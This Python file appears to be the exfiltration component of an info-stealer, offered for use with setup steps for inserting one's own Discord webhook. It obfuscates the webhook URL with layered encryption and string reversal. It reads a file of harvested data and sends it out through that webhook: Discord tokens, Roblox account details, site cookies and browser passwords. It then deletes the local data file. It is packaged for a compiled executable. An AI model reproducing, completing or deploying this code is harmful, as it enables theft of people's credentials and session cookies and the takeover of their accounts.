"""
How to use:
To generate your own encrypted_webhook.txt file:
1. Uncomment the `if __name__ == "__main__":` block at the end of this script.
2. Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL.
3. Run this script. This will generate the encrypted_webhook.txt file.
4. Once the file is generated, you can comment out the block again if desired.
"""

import os
import sys
import logging
import requests
import asyncio
import json
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO)

STATIC_KEY = Fernet.generate_key()

class WebhookEncryptor:
    def __init__(self, key=None):
        self.key = key or STATIC_KEY
        self.cipher = Fernet(self.key)

    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())

    def decrypt(self, encrypted_data):
        return self.cipher.decrypt(encrypted_data).decode()

    def scramble_data(self, static_key, encrypted_webhook, decryption_key):
        combined_data = static_key.decode() + encrypted_webhook.decode() + decryption_key.decode()
        scrambled_data = ''.join(reversed(combined_data))
        return scrambled_data.encode()

    def unscramble_data(self, scrambled_data):
        unscrambled_str = ''.join(reversed(scrambled_data.decode()))
        static_key = unscrambled_str[:44].encode()
        encrypted_webhook = unscrambled_str[44:-44].encode()
        decryption_key = unscrambled_str[-44:].encode()
        return static_key, encrypted_webhook, decryption_key

    def get_webhook_file_path(self):
        return os.path.join(sys._MEIPASS, "encrypted_webhook.txt") if getattr(sys, 'frozen', False) else "encrypted_webhook.txt"

    def get_webhook_url(self):
        try:
            with open(self.get_webhook_file_path(), "rb") as f:
                scrambled_data = f.read()
        except FileNotFoundError:
            logging.error(f"File 'encrypted_webhook.txt' not found!")
            return

        _, encrypted_webhook, decryption_key = self.unscramble_data(scrambled_data)
        decryptor = WebhookEncryptor(decryption_key)
        decrypted_webhook = decryptor.decrypt(encrypted_webhook)

        return decrypted_webhook

    def send_data_to_discord(self, raw_data):
        webhook_url = self.get_webhook_url()
        if not webhook_url:
            logging.error("Failed to retrieve the webhook URL!")
            return

        try:
            data_list = json.loads(raw_data.replace(']\n\n[', ',\n'))
        except json.JSONDecodeError:
            logging.error("Failed to parse saved data into JSON!")
            return

        # Mapping of data types to emojis and colors
        emoji_map = {
            "Discord Token": ("🔑", 0x7289DA),  # Blue color for Discord
            "Roblox Account Details": ("🎮", 0xFF4500),  # Orange color for Roblox
            "Cookies for discord.com": ("🍪", 0x7289DA),
            "Cookies for twitter.com": ("🍪", 0x00ACEE),  # Light blue color for Twitter
            "Cookies for instagram.com": ("🍪", 0xC13584),  # Magenta color for Instagram
            "Cookies for netflix.com": ("🍪", 0xE50914),  # Red color for Netflix
            "Browser Passwords": ("🔒", 0xA6A6A6)  # Grey color for passwords
        }

        def send_embeds(embeds):
            headers = {
                "Content-Type": "application/json"
            }

            payload = {"embeds": embeds}
            response = requests.post(webhook_url, headers=headers, json=payload)
            if response.status_code != 204:
                logging.error(f"Failed to send data to Discord: {response.text}")

        embeds = []

        for data in data_list:
            embed = {
                "title": f"{emoji_map.get(data['Type'], ('🔗', 0x000000))[0]} {data.get('Type', 'Unknown Type')}",  # Default to link emoji and black color
                "color": emoji_map.get(data['Type'], ('🔗', 0x000000))[1],
                "fields": []
            }

            for k, v in data.items():
                if k != "Type":
                    field = {
                        "name": k,
                        "value": str(v) if v is not None else "N/A",
                        "inline": True
                    }
                    embed["fields"].append(field)

            embeds.append(embed)

        # Split the embeds into chunks of 10 and send them
        chunk_size = 10
        for i in range(0, len(embeds), chunk_size):
            send_embeds(embeds[i:i + chunk_size])

        # Call the file deletion function after sending data
        self.delete_encrypted_data()

    def delete_encrypted_data(self):
        """Delete the encrypted_data.dat file."""
        try:
            os.remove("encrypted_data.dat")
            logging.info("Successfully deleted the encrypted_data.dat file.")
        except FileNotFoundError:
            logging.warning("encrypted_data.dat file was not found. It may have been already deleted.")
        except Exception as e:
            logging.error(f"An error occurred while deleting the encrypted_data.dat file: {e}")

def retrieve_saved_data(file_name="encrypted_data.dat"):
    try:
        with open(file_name, "r") as f:
            return f.read()
    except FileNotFoundError:
        logging.error(f"File '{file_name}' not found!")
        return None

def generate_encrypted_webhook(webhook_url: str):
    """Generates an encrypted_webhook.txt file from a given webhook URL."""
    encryptor = WebhookEncryptor()
    encrypted_webhook = encryptor.encrypt(webhook_url)
    decryption_key = Fernet.generate_key()
    decryptor = WebhookEncryptor(decryption_key)
    encrypted_webhook = decryptor.encrypt(webhook_url)
    scrambled_data = encryptor.scramble_data(STATIC_KEY, encrypted_webhook, decryption_key)
    
    with open("encrypted_webhook.txt", "wb") as f:
        f.write(scrambled_data)
    
    logging.info("encrypted_webhook.txt file has been successfully generated.")

# Uncomment the following block to run this script standalone for generating encrypted_webhook.txt that can be used in the compiled exe
"""
if __name__ == "__main__":
    webhook_url = 'YOUR_WEBHOOK_URL_HERE'  # Replace with your actual Discord webhook URL
    generate_encrypted_webhook(webhook_url)
"""